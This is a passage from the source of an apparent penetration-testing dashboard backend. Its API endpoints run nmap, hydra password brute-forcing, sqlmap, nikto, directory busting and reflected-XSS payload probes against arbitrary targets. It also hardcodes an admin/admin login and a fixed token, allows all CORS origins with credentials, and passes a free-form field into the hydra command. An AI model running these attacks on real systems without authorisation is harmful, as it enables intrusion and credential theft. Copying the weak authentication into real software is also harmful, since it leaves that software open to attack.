# ══════════════════════════════════════════════════════════════
#  OSCP DASHBOARD — COMPLETE BACKEND
#  Run: python3 -m uvicorn main:app --host 0.0.0.0 --port 8000 --reload
# ══════════════════════════════════════════════════════════════

from fastapi import FastAPI, Depends, HTTPException
from fastapi.middleware.cors import CORSMiddleware
from fastapi.security import HTTPBearer, HTTPAuthorizationCredentials
from pydantic import BaseModel
from typing import Optional, List
import subprocess, asyncio, re, json, uuid, datetime, os
from urllib.parse import urlparse

app = FastAPI(title="OSCP Dashboard API")

app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

security = HTTPBearer(auto_error=False)
SECRET_TOKEN = "oscp-dashboard-token"

async def verify_token(credentials: HTTPAuthorizationCredentials = Depends(security)):
    if not credentials or credentials.credentials != SECRET_TOKEN:
        raise HTTPException(status_code=401, detail="Invalid token")
    return credentials.credentials

class ScanRequest(BaseModel):
    target: str
    api_key: Optional[str] = None

SCAN_HISTORY = []

def save_scan(scan_id, tool, target, result):
    SCAN_HISTORY.append({
        "id": scan_id, "tool": tool, "target": target,
        "timestamp": datetime.datetime.utcnow().isoformat(),
        "summary": result.get("output","")[:200]
    })
    if len(SCAN_HISTORY) > 200:
        SCAN_HISTORY.pop(0)

async def run_tool(cmd, timeout=60):
    cmd_str = " ".join(str(c) for c in cmd)
    try:
        proc = await asyncio.create_subprocess_exec(
            *[str(c) for c in cmd],
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.STDOUT,
        )
        try:
            out, _ = await asyncio.wait_for(proc.communicate(), timeout=timeout)
            return {"output": out.decode("utf-8", errors="replace"), "cmd": cmd_str}
        except asyncio.TimeoutError:
            try: proc.kill()
            except: pass
            return {"output": f"[Timeout after {timeout}s]", "cmd": cmd_str, "error": "timeout"}
    except Exception as e:
        return {"output": "", "cmd": cmd_str, "error": str(e)}


# ── HEALTH ───────────────────────────────────────────────────
class LoginRequest(BaseModel):
    username: str
    password: str

@app.post("/api/auth/login")
async def login(req: LoginRequest):
    if req.username == "admin" and req.password == "admin":
        return {"access_token": "oscp-dashboard-token", "role": "admin", "username": req.username, "plan": "pro"}
    raise HTTPException(status_code=401, detail="Invalid credentials")

@app.get("/api/health")
async def health():
    tools = ["nmap","masscan","nikto","gobuster","dirb","hydra","sqlmap",
             "wafw00f","whatweb","dnsrecon","whois","amass","theharvester",
             "tcpdump","hping3","commix","curl","wget","dnschef"]
    free_tools = {}
    for tool in tools:
        result = await run_tool(["which", tool], timeout=5)
        free_tools[tool] = {"available": bool(result.get("output","").strip()), "cost": "FREE"}
    return {
        "status": "ok",
        "version": "2.0.0",
        "free_tools": free_tools,
        "timestamp": datetime.datetime.utcnow().isoformat()
    }

@app.post("/api/tools/status")
@app.get("/api/tools/status")
async def tools_status(user=Depends(verify_token)):
    tools = ["nmap","masscan","nikto","gobuster","dirb","hydra","sqlmap",
             "wafw00f","whatweb","dnsrecon","whois","amass","theharvester",
             "tcpdump","hping3","commix","curl","wget"]
    status = {}
    for tool in tools:
        result = await run_tool(["which", tool], timeout=5)
        status[tool] = "installed" if result.get("output","").strip() else "missing"
    return {"status": status, "timestamp": datetime.datetime.utcnow().isoformat()}

@app.get("/api/history")
async def get_history(user=Depends(verify_token)):
    return {"history": list(reversed(SCAN_HISTORY))}

@app.get("/api/scans")
async def get_scans(user=Depends(verify_token)):
    scans = list(reversed(SCAN_HISTORY))
    return {"scans": scans, "total": len(scans)}


# ── PASSWORD ATTACKS — HYDRA ──────────────────────────────────
class HydraRequest(BaseModel):
    target:   str
    service:  str = "http-post-form"
    username: str = ""
    userlist: str = ""
    passlist: str = "/usr/share/wordlists/rockyou.txt"
    port:     str = ""
    extra:    str = ""

@app.post("/api/password/hydra")
async def password_hydra(req: HydraRequest, user=Depends(verify_token)):
    cmd = ["hydra"]
    if req.username:
        cmd += ["-l", req.username]
    elif req.userlist:
        cmd += ["-L", req.userlist]
    else:
        cmd += ["-l", "admin"]
    cmd += ["-P", req.passlist]
    if req.port:
        cmd += ["-s", req.port]
    cmd += ["-t", "4", "-f", "-V", "-w", "5", "-W", "3"]
    if req.extra:
        cmd += req.extra.split()
    parsed = urlparse(req.target if req.target.startswith("http") else "http://"+req.target)
    host = parsed.hostname or req.target
    cmd += [host, req.service]
    result = await run_tool(cmd, timeout=60)
    out = result.get("output","")
    found = []
    for line in out.splitlines():
        if "[" in line and "] login:" in line.lower():
            found.append(line.strip())
    scan_id = str(uuid.uuid4())
    save_scan(scan_id, "hydra", req.target, result)
    return {
        "scan_id": scan_id, "target": req.target, "service": req.service,
        "credentials_found": found, "total": len(found),
        "raw_output": out, "command": result.get("cmd",""),
        "timestamp": datetime.datetime.utcnow().isoformat()
    }


# ══════════════════════════════════════════════════════════════
#  RECON MODULE
# ══════════════════════════════════════════════════════════════

def _recon_host(target: str) -> str:
    t = target.strip()
    if t.startswith("http://") or t.startswith("https://"):
        return urlparse(t).hostname or t
    return t.split("/")[0].strip()

def _web_url(target: str) -> str:
    t = target.strip()
    if not t.startswith("http://") and not t.startswith("https://"):
        t = "http://" + t
    return t

def _is_external(target: str) -> bool:
    host = _recon_host(target)
    return not any(x in host for x in ["lab_","localhost","127.","192.168.","10.","172.20.","0.0.0.0"])

_BROWSER_HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.5",
    "Connection": "keep-alive",
}


@app.post("/api/recon/whois")
async def recon_whois(req: ScanRequest, user=Depends(verify_token)):
    host = _recon_host(req.target)
    result = await run_tool(["whois", host], timeout=30)
    out = result.get("output","")
    def _get(patterns, text):
        for p in patterns:
            m = re.search(p, text, re.IGNORECASE | re.MULTILINE)
            if m: return m.group(1).strip()
        return None
    registrar   = _get([r"Registrar:\s*(.+)", r"registrar:\s*(.+)"], out)
    created     = _get([r"Creation Date:\s*(.+)", r"Created:\s*(.+)", r"created:\s*(.+)"], out)
    expires     = _get([r"Expiry Date:\s*(.+)", r"Registry Expiry Date:\s*(.+)", r"expires:\s*(.+)"], out)
    updated     = _get([r"Updated Date:\s*(.+)", r"last-modified:\s*(.+)"], out)
    registrant  = _get([r"Registrant Name:\s*(.+)", r"Registrant Organization:\s*(.+)"], out)
    country     = _get([r"Registrant Country:\s*(.+)", r"country:\s*(.+)"], out)
    name_servers = re.findall(r"Name Server:\s*(.+)", out, re.IGNORECASE)
    name_servers = [ns.strip().lower() for ns in name_servers[:6]]
    scan_id = str(uuid.uuid4())
    save_scan(scan_id, "whois", req.target, result)
    return {
        "scan_id": scan_id, "target": req.target, "tool": "whois",
        "registrar": registrar, "created": created, "expires": expires,
        "updated": updated, "registrant": registrant, "country": country,
        "name_servers": name_servers, "raw_output": out,
        "timestamp": datetime.datetime.utcnow().isoformat()
    }


@app.post("/api/recon/nmap")
async def recon_nmap(req: ScanRequest, user=Depends(verify_token)):
    host = _recon_host(req.target)
    result = await run_tool(["nmap", "-sV", "-sC", "-T4", "--open", "--top-ports", "1000", host], timeout=180)
    out = result.get("output","")
    ports = []
    for line in out.splitlines():
        m = re.match(r"(\d+)/(tcp|udp)\s+(\w+)\s+(.+)", line.strip())
        if m:
            port, proto, state, service = m.groups()
            parts = service.split(None, 1)
            svc_name = parts[0] if parts else service
            version  = parts[1] if len(parts)>1 else ""
            ports.append({"port":int(port),"proto":proto,"state":state,"service":svc_name,"version":version.strip()})
    banner = None
    bm = re.search(r"\|[_ ]\s*banner:\s*(.+)", out, re.IGNORECASE)
    if bm: banner = bm.group(1).strip()
    os_guess = None
    om = re.search(r"OS details?:\s*(.+)", out, re.IGNORECASE)
    if om: os_guess = om.group(1).strip()
    scan_id = str(uuid.uuid4())
    save_scan(scan_id, "nmap", req.target, result)
    return {
        "scan_id": scan_id, "target": req.target, "tool": "nmap",
        "ports": ports, "total_open": len(ports),
        "banner": banner, "os_guess": os_guess,
        "raw_output": out, "command": result.get("cmd",""),
        "timestamp": datetime.datetime.utcnow().isoformat()
    }


@app.post("/api/recon/masscan")
async def recon_masscan(req: ScanRequest, user=Depends(verify_token)):
    host = _recon_host(req.target)
    result = await run_tool(["masscan", host, "-p1-65535", "--rate=1000", "--wait=2"], timeout=120)
    out = result.get("output","")
    ports = []
    for line in out.splitlines():
        m = re.search(r"Discovered open port (\d+)/(\w+) on (.+)", line)
        if m:
            ports.append({"port":int(m.group(1)),"proto":m.group(2),"host":m.group(3).strip()})
    scan_id = str(uuid.uuid4())
    save_scan(scan_id, "masscan", req.target, result)
    return {
        "scan_id": scan_id, "target": req.target, "tool": "masscan",
        "ports": sorted(ports, key=lambda x:x["port"]),
        "total_open": len(ports), "raw_output": out,
        "timestamp": datetime.datetime.utcnow().isoformat()
    }


@app.post("/api/recon/dns")
async def recon_dns(req: ScanRequest, user=Depends(verify_token)):
    host = _recon_host(req.target)
    result = await run_tool(["dnsrecon", "-d", host, "-t", "std"], timeout=60)
    out = result.get("output","")
    records = []
    for line in out.splitlines():
        line = line.strip()
        for rtype in ["A","AAAA","MX","NS","TXT","SOA","CNAME","PTR","SRV"]:
            pattern = rf"\[\*\]\s+{rtype}\s+(.+)"
            m = re.match(pattern, line, re.IGNORECASE)
            if m:
                records.append({"type":rtype,"value":m.group(1).strip()})
                break
    scan_id = str(uuid.uuid4())
    save_scan(scan_id, "dnsrecon", req.target, result)
    return {
        "scan_id": scan_id, "target": req.target, "tool": "dnsrecon",
        "records": records, "total": len(records), "raw_output": out,
        "timestamp": datetime.datetime.utcnow().isoformat()
    }


@app.post("/api/recon/subdomains")
async def recon_subdomains(req: ScanRequest, user=Depends(verify_token)):
    host = _recon_host(req.target)
    result = await run_tool(["sublist3r", "-d", host, "-t", "5", "-o", "/dev/null"], timeout=120)
    out = result.get("output","")
    subdomains = []
    for line in out.splitlines():
        line = line.strip()
        if line and host in line and not line.startswith("[") and not line.startswith("-"):
            subdomains.append(line)
    subdomains = list(dict.fromkeys(subdomains))
    scan_id = str(uuid.uuid4())
    save_scan(scan_id, "sublist3r", req.target, result)
    return {
        "scan_id": scan_id, "target": req.target, "tool": "sublist3r",
        "subdomains": subdomains, "total": len(subdomains), "raw_output": out,
        "timestamp": datetime.datetime.utcnow().isoformat()
    }


@app.post("/api/recon/theharvester")
async def recon_theharvester(req: ScanRequest, user=Depends(verify_token)):
    host = _recon_host(req.target)
    result = await run_tool(["theHarvester", "-d", host, "-b", "bing,crtsh,dnsdumpster", "-l", "100"], timeout=120)
    out = result.get("output","")
    FALSE_POSITIVE_DOMAINS = ["edge-security.com","github.com","python.org","kali.org"]
    emails_raw = list(dict.fromkeys(re.findall(r"[a-zA-Z0-9._%+\-]+@[a-zA-Z0-9.\-]+\.[a-zA-Z]{2,}", out)))
    emails = [e for e in emails_raw if not any(e.endswith("@"+d) for d in FALSE_POSITIVE_DOMAINS)]
    hosts  = list(dict.fromkeys(re.findall(r"(?:\d{1,3}\.){3}\d{1,3}", out)))
    hosts  = [h for h in hosts if not h.startswith("127.") and not h.startswith("0.")]
    scan_id = str(uuid.uuid4())
    save_scan(scan_id, "theharvester", req.target, result)
    return {
        "scan_id": scan_id, "target": req.target, "tool": "theHarvester",
        "emails": emails, "hosts": hosts,
        "total_emails": len(emails), "total_hosts": len(hosts),
        "raw_output": out, "timestamp": datetime.datetime.utcnow().isoformat()
    }


@app.post("/api/recon/dirb")
async def recon_dirb(req: ScanRequest, user=Depends(verify_token)):
    result = await run_tool(["dirb", _web_url(req.target), "/usr/share/wordlists/dirb/common.txt", "-S", "-r"], timeout=120)
    out = result.get("output","")
    found = []
    for line in out.splitlines():
        m = re.match(r"==> DIRECTORY:\s*(.+)|^\+\s+(https?://\S+)", line.strip())
        if m:
            url = (m.group(1) or m.group(2) or "").strip()
            if url: found.append(url)
    scan_id = str(uuid.uuid4())
    save_scan(scan_id, "dirb", req.target, result)
    return {
        "scan_id": scan_id, "target": req.target, "tool": "dirb",
        "found": found, "total": len(found), "raw_output": out,
        "timestamp": datetime.datetime.utcnow().isoformat()
    }


@app.post("/api/recon/gobuster")
async def recon_gobuster(req: ScanRequest, user=Depends(verify_token)):
    result = await run_tool(
        ["gobuster", "dir", "-u", _web_url(req.target), "-w", "/usr/share/wordlists/dirb/common.txt",
         "-t", "20", "-q", "--no-progress"], timeout=120)
    out = result.get("output","")
    found = []
    for line in out.splitlines():
        m = re.match(r"(/\S+)\s+\(Status:\s*(\d+)\)", line.strip())
        if m: found.append({"path": m.group(1), "status": int(m.group(2))})
    scan_id = str(uuid.uuid4())
    save_scan(scan_id, "gobuster", req.target, result)
    return {
        "scan_id": scan_id, "target": req.target, "tool": "gobuster",
        "found": found, "total": len(found), "raw_output": out,
        "timestamp": datetime.datetime.utcnow().isoformat()
    }


# ══════════════════════════════════════════════════════════════
#  VULNERABILITY SCANNING MODULE
# ══════════════════════════════════════════════════════════════

import urllib.request as _ureq, ssl as _ssl

def _sev(text):
    t = text.lower()
    if any(k in t for k in ["sql injection","remote code","command injection","rce","arbitrary file","traversal","authentication bypass","shell upload"]): return "CRITICAL"
    if any(k in t for k in ["xss","cross-site script","csrf","open redirect","credentials","privilege escalation"]): return "HIGH"
    if any(k in t for k in ["header missing","content-security","x-frame","referrer","hsts","strict-transport","deprecated","information disclosure","version disclosure","cors"]): return "MEDIUM"
    if any(k in t for k in ["clickjack","cookie","cache","banner","mime","server info"]): return "LOW"
    return "MEDIUM"

def _rem(text):
    t = text.lower()
    if "content-security-policy" in t: return "Add Content-Security-Policy header"
    if "strict-transport" in t or "hsts" in t: return "Enable HSTS: Strict-Transport-Security header"
    if "referrer-policy" in t: return "Add Referrer-Policy header"
    if "x-content-type" in t: return "Add X-Content-Type-Options: nosniff header"
    if "x-frame" in t: return "Use Content-Security-Policy frame-ancestors instead of X-Frame-Options"
    if "permissions-policy" in t: return "Add Permissions-Policy header"
    if "sql" in t: return "Use parameterised queries / prepared statements"
    if "xss" in t: return "Sanitise and encode all user input; enforce CSP"
    if "csrf" in t: return "Implement CSRF tokens on all state-changing requests"
    if "cookie" in t: return "Set Secure, HttpOnly, SameSite flags on cookies"
    if "cors" in t: return "Restrict CORS to trusted origins only"
    return "Review and remediate according to OWASP guidelines"

def _detect_spa(url: str) -> bool:
    """Returns True if target is a Single Page App (returns HTML for all routes)."""
    try:
        r = _req_lib.get(url, timeout=8, verify=False, allow_redirects=True)
        body = r.text[:3000].lower()
        return any(m in body for m in [
            "ng-version", "<app-root", "data-reactroot", "__next", "vue.min.js",
            "__angular", "window.__nuxt", "ember.js", "svelte", "ng-app",
            "react.development", "react.production"
        ])
    except: return False

def _path_is_real(base_url: str, path: str) -> bool:
    """Returns True only if the path returns non-HTML content (a real file, not SPA routing)."""
    try:
        r = _req_lib.get(base_url.rstrip("/") + "/" + path.lstrip("/"), timeout=6, verify=False, allow_redirects=True)
        if r.status_code == 403: return True   # access denied = file likely exists
        if r.status_code != 200: return False
        ct = r.headers.get("Content-Type","").lower()
        if "text/html" in ct: return False     # SPA or 404 page returned HTML
        return True
    except: return False


@app.post("/api/scan/nikto")
async def scan_nikto(req: ScanRequest, user=Depends(verify_token)):
    result = await run_tool(["nikto", "-h", _web_url(req.target), "-nointeractive"], timeout=120)
    out = result.get("output","")
    is_spa = _detect_spa(req.target)

    # Paths that nikto probes but are almost always false positives (especially on SPAs)
    FP_PATH_KEYWORDS = [
        ".bash_history",".sh_history",".mysql_history",".psql_history",".sqlite_history",".zsh_history",
        "JAMonAdmin.jsp","PasswordsData.json","login.json","master.json","masters.json",
        "conndb.json","conn.json","connection.json","connections.json","accounts.json",
        "userdata.json","users.json","connstring","elmah.axd","trace.axd",
    ]

    findings = []
    for line in out.splitlines():
        line = line.strip()
        if not line.startswith("+ "): continue
        if any(s in line for s in ["Target IP","Target Hostname","Target Port","Start Time","End Time",
                                    "host(s) tested","Nikto v","requests:","No CGI Directories",
                                    "out of date","OSVDB","Unable to connect","FAIL","Error",
                                    "could not","timed out","Scan terminated"]): continue
        detail = re.sub(r"^\+\s*\[\d+\]\s*","",line).strip().lstrip("+ ").strip()
        detail = re.sub(r"\s*See:\s*https?://\S+","",detail,flags=re.IGNORECASE).strip()
        if not detail or len(detail)<15: continue

        detail_lower = detail.lower()

        # Drop known false-positive probe paths
        if any(fp in detail_lower for fp in FP_PATH_KEYWORDS): continue

        # Drop generic "might be interesting" lines on SPAs — SPA returns 200 for everything
        if is_spa and "might be interesting" in detail_lower: continue

        # For any file-existence claim: verify the path actually returns non-HTML content
        if "might be interesting" in detail_lower or "contains authorization" in detail_lower:
            path_m = re.search(r"^(/[^\s:,]+)", detail)
            if path_m and not _path_is_real(req.target, path_m.group(1)):
                continue  # Path returns HTML — SPA false positive

        findings.append({"detail":detail,"severity":_sev(detail),"cvss":"0.0","cve":"N/A",
                         "cwe":"N/A","cwe_name":"Web Vulnerability","owasp":"A05:2021","remediation":_rem(detail)})

    scan_id = str(uuid.uuid4())
    save_scan(scan_id,"nikto",req.target,result)
    return {"scan_id":scan_id,"target":req.target,"tool":"nikto","findings":findings,"total":len(findings),"raw_output":out,"command":result.get("cmd",""),"timestamp":datetime.datetime.utcnow().isoformat()}


@app.post("/api/scan/nmap_vuln")
async def scan_nmap_vuln(req: ScanRequest, user=Depends(verify_token)):
    host = _recon_host(req.target)
    result = await run_tool(["nmap","--script","vuln","-T4",host], timeout=180)
    out = result.get("output","")
    findings = []
    current = None
    for line in out.splitlines():
        line = line.strip()
        m = re.match(r"\|\s*(CVE-[\d-]+).*?([\d.]+)\s*(.+)?", line)
        if m:
            cve,cvss,desc = m.group(1),m.group(2),(m.group(3) or "").strip()
            sev = "CRITICAL" if float(cvss)>=9 else "HIGH" if float(cvss)>=7 else "MEDIUM" if float(cvss)>=4 else "LOW"
            findings.append({"detail":f"{cve}: {desc}" if desc else cve,"severity":sev,"cvss":cvss,"cve":cve,"cwe":"N/A","cwe_name":"Network Vulnerability","owasp":"A06:2021","remediation":"Apply vendor patch for "+cve})
        elif "|_" in line and "VULNERABLE" in line.upper():
            findings.append({"detail":line.replace("|_","").strip(),"severity":"HIGH","cvss":"7.5","cve":"N/A","cwe":"N/A","cwe_name":"Network Vulnerability","owasp":"A06:2021","remediation":"Patch the vulnerable service"})
    scan_id = str(uuid.uuid4())
    save_scan(scan_id,"nmap_vuln",req.target,result)
    return {"scan_id":scan_id,"target":req.target,"tool":"nmap_vuln","findings":findings,"total":len(findings),"raw_output":out,"command":result.get("cmd",""),"timestamp":datetime.datetime.utcnow().isoformat()}


@app.post("/api/scan/sqlmap")
async def scan_sqlmap(req: ScanRequest, user=Depends(verify_token)):
    result = await run_tool(["sqlmap","-u",_web_url(req.target),"--batch","--level=2","--risk=1","--output-dir=/tmp/sqlmap_out","--forms","--crawl=2"], timeout=180)
    out = result.get("output","")
    findings = []
    vuln_params = re.findall(r"Parameter:\s*(.+?)\s+\(", out)
    for p in dict.fromkeys(vuln_params):
        findings.append({"detail":f"SQL Injection in parameter: {p}","severity":"CRITICAL","cvss":"9.8","cve":"N/A","cwe":"CWE-89","cwe_name":"SQL Injection","owasp":"A03:2021","remediation":"Use parameterised queries / prepared statements"})
    scan_id = str(uuid.uuid4())
    save_scan(scan_id,"sqlmap",req.target,result)
    return {"scan_id":scan_id,"target":req.target,"tool":"sqlmap","findings":findings,"total":len(findings),"raw_output":out,"command":result.get("cmd",""),"timestamp":datetime.datetime.utcnow().isoformat()}


@app.post("/api/scan/headers")
async def scan_headers(req: ScanRequest, user=Depends(verify_token)):
    SECURITY_HEADERS = [
        ("content-security-policy","Content-Security-Policy","HIGH","CSP prevents XSS attacks","6.1","CWE-79","Cross-Site Scripting","A03:2021"),
        ("strict-transport-security","HSTS","HIGH","Forces HTTPS connections","7.5","CWE-319","Cleartext Transmission","A02:2021"),
        ("x-content-type-options","X-Content-Type-Options","MEDIUM","Prevents MIME sniffing","5.3","CWE-693","Protection Mechanism Failure","A05:2021"),
        ("x-frame-options","X-Frame-Options","MEDIUM","Prevents clickjacking","6.1","CWE-1021","Improper Frame Restriction","A05:2021"),
        ("referrer-policy","Referrer-Policy","LOW","Controls referrer information","3.1","CWE-200","Information Exposure","A01:2021"),
        ("permissions-policy","Permissions-Policy","LOW","Controls browser features","3.1","CWE-16","Configuration","A05:2021"),
    ]
    findings = []
    headers_found = {}
    try:
        result = await run_tool(["curl","-sI","--max-time","10","-L",req.target], timeout=20)
        out = result.get("output","")
        for line in out.splitlines():
            if ":" in line:
                k,_,v = line.partition(":")
                headers_found[k.strip().lower()] = v.strip()
        for hdr_key, hdr_name, sev, desc, cvss, cwe, cwe_name, owasp in SECURITY_HEADERS:
            if hdr_key not in headers_found:
                findings.append({"detail":f"Missing {hdr_name} header — {desc}","severity":sev,"cvss":cvss,"cve":"N/A","cwe":cwe,"cwe_name":cwe_name,"owasp":owasp,"remediation":_rem(hdr_name)})
    except Exception as e:
        findings.append({"detail":f"Scan error: {e}","severity":"INFO","cvss":"0.0","cve":"N/A","cwe":"N/A","cwe_name":"Scan Error","owasp":"N/A","remediation":"Check target"})
    scan_id = str(uuid.uuid4())
    save_scan(scan_id,"headers",req.target,{"output":str(findings)})
    return {"scan_id":scan_id,"target":req.target,"tool":"headers","findings":findings,"total":len(findings),"headers_present":headers_found,"timestamp":datetime.datetime.utcnow().isoformat()}


@app.post("/api/scan/cookies")
async def scan_cookies(req: ScanRequest, user=Depends(verify_token)):
    findings = []
    cookies = []
    try:
        result = await run_tool(["curl","-sI","--max-time","10","-L",req.target], timeout=20)
        out = result.get("output","")
        for line in out.splitlines():
            if line.lower().startswith("set-cookie:"):
                cookie_val = line[11:].strip()
                cookie_name = cookie_val.split("=")[0].split(";")[0].strip()
                issues = []
                if "httponly" not in cookie_val.lower(): issues.append("Missing HttpOnly")
                if "secure" not in cookie_val.lower():   issues.append("Missing Secure flag")
                if "samesite" not in cookie_val.lower(): issues.append("Missing SameSite")
                score = max(0, 100 - len(issues)*30)
                cookies.append({"name":cookie_name,"cookie":cookie_val,"issues":issues,"secure_score":score})
                if issues:
                    findings.append({"detail":f"Cookie '{cookie_name}': {', '.join(issues)}","severity":"MEDIUM","cvss":"5.4","cve":"N/A","cwe":"CWE-614","cwe_name":"Sensitive Cookie","owasp":"A02:2021","remediation":"Set Secure, HttpOnly, SameSite=Strict on all session cookies"})
    except Exception as e:
        findings.append({"detail":f"Scan error: {e}","severity":"INFO","cvss":"0.0","cve":"N/A","cwe":"N/A","cwe_name":"Scan Error","owasp":"N/A","remediation":"Check target"})
    scan_id = str(uuid.uuid4())
    save_scan(scan_id,"cookies",req.target,{"output":str(cookies)})
    return {"scan_id":scan_id,"target":req.target,"tool":"cookies","findings":findings,"cookies":cookies,"total":len(cookies),"timestamp":datetime.datetime.utcnow().isoformat()}


@app.post("/api/scan/ssl")
async def scan_ssl(req: ScanRequest, user=Depends(verify_token)):
    host = _recon_host(req.target)
    result = await run_tool(["sslscan","--no-colour",host], timeout=60)
    out = result.get("output","")
    findings = []
    if re.search(r"SSLv[23]|TLSv1\.0|TLSv1\.1",out,re.IGNORECASE):
        findings.append({"detail":"Weak SSL/TLS protocol enabled (SSLv2/3 or TLS 1.0/1.1)","severity":"HIGH","cvss":"7.5","cve":"N/A","cwe":"CWE-326","cwe_name":"Weak Cryptography","owasp":"A02:2021","remediation":"Disable SSLv2, SSLv3, TLS 1.0, TLS 1.1. Use TLS 1.2+ only."})
    if re.search(r"RC4|DES|3DES|EXPORT|NULL|anon",out,re.IGNORECASE):
        findings.append({"detail":"Weak cipher suite detected (RC4/DES/EXPORT/NULL)","severity":"HIGH","cvss":"7.5","cve":"N/A","cwe":"CWE-327","cwe_name":"Broken Algorithm","owasp":"A02:2021","remediation":"Disable weak cipher suites. Use AES-GCM with perfect forward secrecy."})
    if "self-signed" in out.lower() or "untrusted" in out.lower():
        findings.append({"detail":"Self-signed or untrusted SSL certificate","severity":"MEDIUM","cvss":"5.3","cve":"N/A","cwe":"CWE-295","cwe_name":"Certificate Validation","owasp":"A02:2021","remediation":"Use a certificate from a trusted CA."})
    scan_id = str(uuid.uuid4())
    save_scan(scan_id,"ssl",req.target,result)
    return {"scan_id":scan_id,"target":req.target,"tool":"sslscan","findings":findings,"total":len(findings),"raw_output":out,"timestamp":datetime.datetime.utcnow().isoformat()}


@app.post("/api/scan/xss")
async def scan_xss(req: ScanRequest, user=Depends(verify_token)):
    findings = []
    raw_lines = []
    base = req.target.rstrip("/")

    # Step 1: curl-based reflected XSS — test common parameters
    xss_params = ["q", "search", "name", "id", "query", "s", "term", "keyword", "user", "input"]
    xss_payloads = [
        ("<script>alert(1)</script>", "<script>alert(1)</script>"),
        ("<img src=x onerror=alert(1)>", "onerror=alert"),
        ("<svg onload=alert(1)>", "onload=alert"),
    ]
    found_xss = False
    for param in xss_params:
        for payload, marker in xss_payloads:
            r = _http_get(f"{base}?{param}={payload}", timeout=6)
            if r and marker in r.text:
                findings.append({"detail":f"Reflected XSS: parameter '{param}' reflects unencoded HTML — payload executes in browser","severity":"HIGH","cvss":"7.4","cve":"N/A","cwe":"CWE-79","cwe_name":"Cross-Site Scripting","owasp":"A03:2021","remediation":"HTML-encode all user-supplied input before reflecting in responses. Add Content-Security-Policy header."})
                raw_lines.append(f"[!] Reflected XSS confirmed via ?{param}={payload}")
                found_xss = True
                break
        if found_xss: break

    # Step 2: check if any user input reflects at all (potential XSS indicator)
    if not found_xss:
        probe = "XSSTEST9981"
        r = _http_get(f"{base}?q={probe}", timeout=8)
        if r and probe in r.text:
            findings.append({"detail":"Input reflection detected — query parameter reflected in response without encoding (likely XSS)","severity":"HIGH","cvss":"7.4","cve":"N/A","cwe":"CWE-79","cwe_name":"Cross-Site Scripting","owasp":"A03:2021","remediation":"Encode all reflected user input. Never insert raw user data into HTML."})
            raw_lines.append(f"[!] Input reflection confirmed — potential XSS at ?q=")

    # Step 3: also try xsstrike if installed
    result = await run_tool(["python3","/usr/share/xsstrike/xsstrike.py","-u",req.target,"--crawl","--skip-dom","-l","1"], timeout=60)
    out = result.get("output","")
    for line in out.splitlines():
        if "vulnerable" in line.lower() or ("xss" in line.lower() and "[+]" in line):
            findings.append({"detail":line.strip(),"severity":"HIGH","cvss":"7.4","cve":"N/A","cwe":"CWE-79","cwe_name":"Cross-Site Scripting","owasp":"A03:2021","remediation":"Sanitise and encode all user input; enforce Content-Security-Policy."})

    # Step 4: DOM XSS indicator — lack of CSP means DOM XSS is unprotected
    r2 = _http_get(base, timeout=8)
    if r2 and not r2.headers.get("Content-Security-Policy"):
        findings.append({"detail":"No Content-Security-Policy header — DOM-based XSS attacks have no browser-level protection","severity":"MEDIUM","cvss":"5.4","cve":"N/A","cwe":"CWE-79","cwe_name":"Cross-Site Scripting","owasp":"A03:2021","remediation":"Deploy a strict Content-Security-Policy to mitigate XSS impact."})

    scan_id = str(uuid.uuid4())
    save_scan(scan_id,"xss",req.target,{"output":"\n".join(raw_lines) or out})
    return {"scan_id":scan_id,"target":req.target,"tool":"xss","findings":findings,"total":len(findings),"raw_output":out,"timestamp":datetime.datetime.utcnow().isoformat()}


@app.post("/api/scan/cms")
async def scan_cms(req: ScanRequest, user=Depends(verify_token)):
    result = await run_tool(["whatweb","--color=never","--no-errors","-a","3",req.target], timeout=60)
    out = result.get("output","")
    findings = []
    for kw,detail,sev in [
        ("WordPress","WordPress CMS detected — check for outdated plugins","HIGH"),
        ("Joomla","Joomla CMS detected — check for known CVEs","HIGH"),
        ("Drupal","Drupal CMS detected — Drupalgeddon vulnerabilities may apply","HIGH"),
        ("jQuery[1","Outdated jQuery version detected","MEDIUM"),
        ("Bootstrap[2","Outdated Bootstrap version","LOW"),
    ]:
        if kw.lower() in out.lower():
            findings.append({"detail":detail,"severity":sev,"cvss":"7.5" if sev=="HIGH" else "5.3","cve":"N/A","cwe":"CWE-1035","cwe_name":"Using Vulnerable Components","owasp":"A06:2021","remediation":"Update CMS and all plugins to latest versions."})
    scan_id = str(uuid.uuid4())
    save_scan(scan_id,"cms",req.target,result)
    return {"scan_id":scan_id,"target":req.target,"tool":"whatweb","findings":findings,"total":len(findings),"raw_output":out,"timestamp":datetime.datetime.utcnow().isoformat()}


@app.post("/api/scan/dirb")
async def scan_dirb(req: ScanRequest, user=Depends(verify_token)):
    result = await run_tool(["dirb",_web_url(req.target),"/usr/share/wordlists/dirb/common.txt","-S","-r"], timeout=120)
    out = result.get("output","")
    found = []
    for line in out.splitlines():
        m = re.match(r"==> DIRECTORY:\s*(.+)|^\+\s+(https?://\S+)", line.strip())
        if m:
            url = (m.group(1) or m.group(2) or "").strip()
            if url: found.append(url)
    findings = [{"detail":f"Accessible path: {u}","severity":"LOW","cvss":"3.1","cve":"N/A","cwe":"CWE-538","cwe_name":"File Exposure","owasp":"A01:2021","remediation":"Restrict access to sensitive directories"} for u in found]
    scan_id = str(uuid.uuid4())
    save_scan(scan_id,"dirb",req.target,result)
    return {"scan_id":scan_id,"target":req.target,"tool":"dirb","findings":findings,"found":found,"total":len(found),"raw_output":out,"timestamp":datetime.datetime.utcnow().isoformat()}


@app.post("/api/scan/nuclei")
async def nuclei_scan(req: ScanRequest, user=Depends(verify_token)):
    cmd = ["nuclei","-u",_web_url(req.target),"-severity","critical,high,medium,low","-c","10","-timeout","8","-no-color","-jsonl"]
    result = await run_tool(cmd, timeout=240)
    findings = []
    CVSS_MAP = {"critical":"9.8","high":"7.5","medium":"5.3","low":"3.1"}
    for line in result["output"].split("\n"):
        line = line.strip()
        if not line: continue
        try:
            data = json.loads(line)
            info = data.get("info",{})
            sev  = info.get("severity","info").lower()
